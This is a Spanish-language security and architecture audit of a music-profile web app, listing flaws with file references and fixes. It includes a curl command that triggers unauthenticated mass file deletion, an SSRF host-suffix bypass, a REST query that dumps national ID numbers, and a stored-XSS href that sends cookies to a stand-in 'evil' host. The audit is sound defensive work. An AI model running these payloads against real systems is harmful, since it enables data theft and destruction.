# Auditoría técnica de Vibe

Fecha: 3 de agosto de 2026 · Rama `main` @ `26665ab`
Alcance: seguridad, lógica de negocio, arquitectura, escalabilidad y madurez de producto.

Resumen: el producto está muy avanzado en funcionalidad y en UI, pero la capa de
plataforma (autorización, integridad de datos, operación) está a nivel de prototipo.
Hay **6 fallas críticas explotables hoy**, dos de ellas sin necesidad de tener cuenta.
Nada de esto es difícil de arreglar, pero ninguna debe sobrevivir al lanzamiento público.

---

## P0 — Críticas (explotables ahora mismo)

### 1. `/api/cleanup-orphaned-files` no tiene autenticación → borrado masivo remoto

`app/api/cleanup-orphaned-files/route.ts:26` importa `getAuthenticatedUser` **pero nunca lo llama**.
El endpoint lista todo el bucket R2 y borra cada archivo que no encuentre referenciado.
Cualquiera en internet puede correr esto:

```bash
curl -X POST https://tu-dominio/api/cleanup-orphaned-files -H 'Content-Type: application/json' -d '{"folder":"images"}'
```

Peor: `folder` viene del body sin validar, así que se puede apuntar a cualquier prefijo del bucket.
Y `app/cleanup/page.tsx` es una página **pública sin guard de sesión** que expone un botón para hacerlo.

**Arreglo:** exigir sesión + rol de administrador, validar `folder` contra la whitelist, y sacar
`/cleanup` de la app (o moverlo a un script de mantenimiento fuera del bundle).

### 2. SSRF en `/api/image-proxy`

`app/api/image-proxy/route.ts:14` valida con `target.startsWith(R2_PUBLIC_URL)` **sin la barra final**.
Si `R2_PUBLIC_URL` es `https://pub-abc.r2.dev`, entonces `https://pub-abc.r2.dev.atacante.com/x`
pasa la validación. El servidor hace `fetch()` a ese destino y devuelve la respuesta al cliente:
proxy abierto desde la IP de tus funciones serverless, útil para escanear la red interna de Vercel
o para lavar tráfico contra terceros.

**Arreglo:** `new URL(target).origin === new URL(R2_PUBLIC_URL).origin`, además de límite de tamaño,
timeout y forzar `Content-Type: image/*` en la respuesta.

### 3. Fuga de datos personales: `profiles` es de lectura pública total

`supabase/harden_profiles_rls.sql:33` — `profiles_select_public ... using (true)` para `anon`.
Pero la tabla `profiles` guarda, entre otras cosas:

- `legal_settings jsonb` → **nombre legal y DNI** del artista (`supabase/profiles_legal_settings.sql`).
- `draft_content jsonb` → todo el borrador sin publicar de cada usuario.
- `owner_user_id`, `user_id` → correlación directa con `auth.users`.

Con la anon key (que está en el bundle del navegador, por diseño) cualquiera hace:

```
GET /rest/v1/profiles?select=* → volcado completo de DNIs y borradores de toda la plataforma
```

Esto no es solo un bug: guardar DNI y exponerlo te pone en incumplimiento directo de la
Ley 29733 de Protección de Datos Personales del Perú, y de GDPR si tienes un solo usuario europeo.

**Arreglo:** la lectura pública debe ir contra una **vista** (`public_profiles`) que exponga solo
las columnas públicas, y la política de `profiles` pasar a `user_id = auth.uid() or owner_user_id = auth.uid()`.
`legal_settings` debería vivir en una tabla aparte, cifrada en reposo.

### 4. XSS almacenado vía `javascript:` en cualquier campo de enlace

`lib/contact-channel.ts:47` termina con: *"Cualquier otra cosa: se usa tal cual como link"*.
El editor no valida el esquema. Un artista guarda `javascript:fetch('//evil/'+document.cookie)`
en su contacto y `components/blocks/hero-block.tsx:82` lo renderiza como `href`.
Se ejecuta en el navegador de **cada visitante de ese perfil**.

Mismo patrón sin validar en:
- `hero-block.tsx:222` — `social.href`
- `merch-block.tsx:60` — `product.purchaseUrl`
- `service-block.tsx:46` — `service.bookingUrl`
- `credits-block.tsx:127` — `credit.externalUrl`
- `publicaciones-block.tsx:172` y `app/[username]/tienda/page.tsx:316,408`

La CSP no salva esto: `javascript:` en `href` no lo bloquea `script-src`.

**Arreglo:** un `safeHref()` central que solo deje pasar `https:`, `mailto:` y `tel:`, aplicado
tanto al guardar (validación en el inspector) como al renderizar (defensa en profundidad).

### 5. `/api/delete-file`: cualquier usuario autenticado puede borrar archivos de otro

`app/api/delete-file/route.ts` verifica que haya sesión, pero **nunca verifica que el archivo
sea tuyo**. La única protección es un chequeo de "¿alguien lo sigue usando?" que compara contra
un `JSON.stringify` de la base. Eso falla de dos formas:

- Un archivo subido pero **aún no publicado** (o referenciado solo desde un `draft_content`,
  que ese query no lee) se considera huérfano → lo borras.
- PostgREST devuelve **máximo 1000 filas por defecto**. `select("content")` sobre `profile_blocks`
  sin `.range()` deja de ver el resto de la tabla apenas superas los 1000 bloques. A partir de
  ahí el "haystack" está incompleto y el endpoint **borra archivos que sí están en uso**.
  Con ~150 usuarios activos ya estás ahí. Lo mismo aplica a `cleanup-orphaned-files`.

**Arreglo:** guardar las subidas en una tabla `media_assets (key, owner_profile_id, created_at)`
y autorizar el borrado por propietario, no por búsqueda de texto. Es además la única forma
de tener cuotas (ver §24).

### 6. Tablas sin RLS definida en ningún lado

`music_feed`, `orders`, `order_items` y `donations` se usan en el código pero **no aparecen en
ningún archivo de `supabase/`** con políticas. `products`/`services` venían del scaffold con
políticas `*_all_anon` (ALL, `true`, para `anon`) y se cerraron a mano — es razonable asumir que
estas cuatro siguen así.

Si es el caso, `lib/musicFeed.ts:130` (`deleteTrackFromFeed` borra por `id`, sin chequeo de dueño)
significa que cualquiera puede borrar la música de cualquiera. Y `orders` expondría datos de compra.

**Arreglo:** correr `select tablename, policyname, cmd, roles, qual, with_check from pg_policies
where schemaname='public'` y cerrar todo lo que tenga `qual = true` fuera de los SELECT públicos
intencionales. Debe quedar un archivo por tabla, versionado.

---

## P1 — Fallas de lógica y de integridad

### 7. Publicar borra antes de escribir, sin transacción → pérdida total del perfil

`components/profile-editor.tsx:657` hace `DELETE from profile_blocks where profile_id = X`
y luego `INSERT` de los bloques nuevos. Si el insert falla (red caída en el celular, RLS,
payload grande, error de validación), **el perfil público queda vacío** y no hay rollback.
El borrador ya fue consumido. Es el mismo tipo de fallo que ya perseguiste antes con el
"archivo no encontrado".

**Arreglo:** un RPC de Postgres `publish_profile(profile_id, blocks jsonb)` que haga delete+insert
dentro de una transacción. Bonus: se vuelve atómico también respecto al `draft_content`.

### 8. La identidad de usuario es `display_name` con `ilike` — no escala y es manipulable

`app/[username]/page.tsx:83-89`:

```ts
const displayNameSlug = username.replaceAll("-", " ");
supabase.from("profiles").select(...).ilike("display_name", displayNameSlug).maybeSingle()
```

Cinco problemas en cuatro líneas:

1. **No hay unicidad.** Dos usuarios llamados "Nova Reyes" → `maybeSingle()` devuelve error
   `PGRST116` y **ambos perfiles se vuelven inalcanzables**. No es hipotético: es inevitable.
2. **`ilike` interpreta comodines.** `%` y `_` vienen de la URL sin escapar. Visitar `/%25`
   hace match con un perfil arbitrario; `/a%25` enumera perfiles por prefijo.
3. **No hay palabras reservadas.** Alguien se registra como "dashboard", "login", "legal",
   "perfil", "api" → su perfil es inalcanzable para siempre (gana la ruta estática de Next).
4. **Renombrarse rompe todos los enlaces.** Los QR impresos, los links compartidos en Instagram
   y las tarjetas PDF que ya generaste apuntan a un slug muerto. Sin historial de slugs, sin redirect.
5. **El slug es lossy.** "Nova-Reyes", "Nova Reyes" y "nova reyes" colapsan al mismo destino;
   acentos y emoji no tienen reglas.

**Arreglo:** columna `username citext unique not null` con constraint de formato
(`^[a-z0-9_]{3,30}$`), lista de reservadas, elección explícita en el registro, y tabla
`username_history` para redirigir 301 los antiguos.

### 9. El fallback al perfil semilla mezcla datos entre usuarios

El patrón `user?.id ?? PROFILE_ID` (con `PROFILE_ID = "0000...0000"`) aparece en
`profile-editor.tsx:339`, `pedidos/page.tsx:56`, y varios más. Un visitante **no autenticado**
que entra a `/dashboard` obtiene un editor apuntando al perfil semilla y puede leer y sobrescribir
lo que otro anónimo dejó ahí. Y las políticas de `licenses`/`author_certificates` permiten
explícitamente a **cualquier autenticado** insertar y leer contra ese UUID
(`harden_licenses_and_certificates_rls.sql:12`): es un buzón compartido de datos legales.

**Arreglo:** eliminar `PROFILE_ID` del código de producción. Sin sesión → redirect a `/login`.

### 10. El feed devuelve filas arbitrarias

`lib/feed/publicPosts.ts:57` hace `.limit(limit)` **sin `.order()`**. Postgres no garantiza
ningún orden sin `ORDER BY`: no estás mostrando "las 60 publicaciones más recientes", estás
mostrando 60 filas cualesquiera, y con la tabla creciendo cambia cuáles. El contenido nuevo
puede no aparecer nunca.

`lib/feed/discovery.ts:81` trae 500 filas de `products` y `services` y las agrupa **en el cliente**,
en cada carga del feed. Con 5.000 productos, el feed simplemente miente (ve el 10%) y descarga
megas de JSON al celular del usuario.

**Arreglo:** ordenar siempre; paginación con keyset (`created_at < cursor`); y mover la agregación
de descubrimiento a una vista materializada o un RPC con `group by`.

### 11. Suplantación de identidad en comentarios y preguntas

`lib/post-comments.ts:83` inserta `author_name` tal como lo manda el cliente, y la política RLS
solo valida `user_id = auth.uid()`. Nada impide postear un comentario firmado como cualquier
otro artista de la plataforma. Igual en `profile_questions.asker_display_name`.

**Arreglo:** no denormalizar el nombre; resolverlo por join contra `profiles` al leer. Si necesitas
la denormalización por rendimiento, escríbela desde un trigger, no desde el cliente.

### 12. Sin control de concurrencia en el editor

Dos pestañas abiertas (o celular + laptop) sobrescriben el trabajo la una de la otra sin aviso:
el autoguardado del borrador y `handlePublish` hacen last-write-wins sobre la misma fila.

**Arreglo:** columna `version int` y `.eq("version", knownVersion)` en el update; si afecta 0 filas,
avisar "alguien más editó este perfil".

### 13. `ignoreBuildErrors: true`

`next.config.mjs:71`. TypeScript está apagado en el build. Todo el valor de tener tipos —
que es exactamente lo que te protege en un código de 21.000 líneas con JSONB sin esquema —
está desactivado. Cualquier error de tipos llega a producción.

### 14. Sin rate limiting en ningún endpoint

- `/api/generate-image` — consume créditos de Together AI. Un usuario con cuenta gratuita
  agota tu saldo en minutos. (Nota aparte: `TOGETHER_API_KEY` **no está en `.env.local`**;
  hoy esta ruta manda `Bearer undefined` y devuelve 500 con el mensaje crudo del tercero.)
- `/api/oembed` — sin autenticación, hace fetch a URLs de terceros. Proxy gratis.
- Comentarios, preguntas y registro — sin límite: spam trivial.

**Arreglo:** rate limit por IP y por usuario (Upstash Redis o el rate limiting de Vercel),
más captcha invisible en el registro.

---

## P2 — Arquitectura, escalabilidad y madurez

### 15. Cero SEO y cero previsualización al compartir — el problema de producto más caro

Todas las páginas públicas son `"use client"` con los datos cargados por `useEffect`.
No hay `generateMetadata`, no hay `robots.ts`, no hay `sitemap.ts`, no hay imagen Open Graph.

Consecuencias directas para el negocio de Vibe:
- Google indexa un esqueleto vacío. Buscar el nombre de un artista **no** encuentra su perfil de Vibe.
- Pegar un link de perfil en WhatsApp, Instagram o Twitter no muestra foto ni nombre:
  muestra "Vibe — Tu música, tu escenario" para todos los perfiles por igual.
- Cada visita son 4 roundtrips secuenciales al navegador antes de ver contenido.

Para una plataforma cuyo producto *es* el perfil público compartible, esto es existencial.

**Arreglo:** convertir `/[username]` y `/[username]/tienda` a Server Components con
`generateMetadata` (título, descripción, `openGraph.images` con la foto del artista),
`revalidate` o `unstable_cache`, y `generateStaticParams` para los perfiles activos.
Es la única corrección de esta lista que cambia la trayectoria comercial del producto.

### 16. Sin middleware ni protección de rutas en el borde

No existe `middleware.ts`. Toda la autorización de rutas es un `useEffect` que hace
`router.push("/login")` después de renderizar. El HTML y el JS del panel se sirven a cualquiera,
y hay un parpadeo visible de contenido protegido antes del redirect.

### 17. Las migraciones no son migraciones

23 archivos `.sql` sueltos en `supabase/`, idempotentes, corridos a mano en el SQL Editor,
sin orden garantizado, sin registro de qué se aplicó. Ya te mordió: `harden_profiles_rls.sql`
borró las políticas de banda y hubo que escribir `fix_group_creation_rls.sql` para reponerlas,
y luego `setup_vibra.sql` para reponerlas otra vez. El código tiene fallbacks en cascada
(`lib/musicFeed.ts:85`, `lib/catalog.ts`, `lib/feed/discovery.ts`) que intentan tres `select`
distintos porque **la app no sabe qué esquema tiene la base**. Eso es deuda que se paga en cada feature.

**Arreglo:** Supabase CLI con `supabase/migrations/` numeradas, `supabase db diff`, y aplicación
en CI. Los fallbacks de "por si la columna no existe" desaparecen.

### 18. Sin tests, sin linter funcional, sin CI

- `package.json` declara `"lint": "eslint ."` pero **ESLint no está instalado ni configurado**.
- Cero tests de cualquier tipo.
- No hay `.github/workflows`. No hay entorno de staging (`.vercel` apunta a un solo proyecto).

Con 21.000 líneas y RLS como única frontera de seguridad, no tener un test que verifique
"el usuario A no puede escribir sobre el perfil de B" es el riesgo más silencioso de todos.

**Arreglo mínimo viable:** Vitest + un archivo de tests de RLS que corra contra una base
efímera, ejecutado en GitHub Actions junto a `tsc --noEmit`.

### 19. Sin observabilidad

Todos los errores terminan en `console.error`. En Vercel eso significa que se pierden.
No hay Sentry, ni logs estructurados, ni alertas, ni métricas. Cuando un usuario diga
"se borraron mis fotos", no vas a tener con qué reconstruir qué pasó.

### 20. Sin moderación ni cumplimiento

Tienes `/legal/copyright`, `/legal/comunidad` y `/legal/privacidad` prometiendo procesos
que **no existen en el producto**:

- No hay forma de reportar contenido ni de bloquear a un usuario.
- No hay flujo de takedown DMCA, ni contranotificación, ni suspensión de cuentas.
- No hay borrado de cuenta ni exportación de datos (obligatorios bajo Ley 29733 y GDPR,
  y especialmente graves porque **almacenas DNIs**).
- No hay registro de auditoría de quién cambió qué.
- No hay panel de administración: hoy moderas entrando al SQL Editor de Supabase.

Una plataforma que aloja música subida por terceros sin proceso de takedown es un objetivo
legal fácil. Esto es tan bloqueante para el lanzamiento como cualquier bug de la sección P0.

### 21. Sin cuotas ni límites de costo

Nada limita cuánto sube un usuario a R2. Una cuenta puede subir un terabyte. No hay contabilidad
de uso por perfil (imposible sin la tabla `media_assets` de §5), ni límites por plan,
ni alertas de gasto. Tu costo de infraestructura es lineal e ilimitado respecto al abuso.

### 22. Sin caché ni CDN en las lecturas

Cada visita a un perfil pega directo contra Supabase desde el navegador del visitante:
perfil, acento, bloques, catálogo — cuatro consultas, ninguna cacheada, ninguna en el borde.
Un artista con tráfico real satura su propio perfil. Con Server Components + `revalidate`
esto pasa a costar cero consultas para el 99% de las visitas.

### 23. Endurecimiento pendiente de la CSP

`next.config.mjs` está bien pensado, pero `script-src` lleva `'unsafe-inline'` y `'unsafe-eval'`,
que anulan buena parte de su valor. La versión profesional usa nonces por request vía middleware.
También conviene: `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`, y quitar
`img-src https:` genérico a favor de una lista de hosts.

### 24. Detalles menores que igual conviene cerrar

- `app/api/generate-image/route.ts:47` y `oembed/route.ts:34` devuelven `error.message` crudo
  al cliente: filtra mensajes internos y de terceros.
- `metadata.generator: 'v0.app'` en `app/layout.tsx:17` — cosmético, pero delata el andamiaje.
- `lib/site.ts` todavía usa tu correo personal como contacto legal, con el `⚠️` de recordatorio.
- `app/api/upload-url` valida `contentType` solo *si viene*: un cliente que lo omite obtiene
  una URL firmada con `application/octet-stream`. R2 es público; sirve para hospedar cualquier cosa.
- No hay `app/error.tsx` ni `app/not-found.tsx`: un error de render muestra la pantalla
  genérica de Next.
- `frame-ancestors 'self'` bloquea el embebido del perfil en sitios externos. Para una plataforma
  de músicos, permitir que embeban su propio reproductor podría ser una feature deseada.

---

## Plan de trabajo propuesto

**Fase 0 — Antes de que entre un solo usuario real (1–2 días)**
Los seis P0. Son cambios acotados y ninguno toca la UI:
auth en `cleanup`, origin check en `image-proxy`, vista `public_profiles` + RLS de `profiles`,
`safeHref()`, `media_assets` + autorización de borrado, auditoría de `pg_policies`.

**Fase 1 — Integridad de datos (3–5 días)**
RPC transaccional de publicación, `username` único con historial, eliminación de `PROFILE_ID`,
orden y paginación del feed, versión optimista en el editor, `tsc` prendido.

**Fase 2 — Plataforma (1–2 semanas)**
Server Components + metadata OG + sitemap en las páginas públicas (mayor retorno comercial),
middleware de auth, migraciones con Supabase CLI, CI con tests de RLS, Sentry, rate limiting.

**Fase 3 — Operación a escala (continuo)**
Panel de administración, reportes/bloqueos/DMCA, borrado y exportación de cuenta,
cuotas por plan, caché en el borde, backups verificados.

Mi recomendación de orden real: Fase 0 completa, luego **§15 (SEO/OG) antes que el resto de la
Fase 1**, porque es lo único de la lista que cambia cuánta gente llega a Vibe.
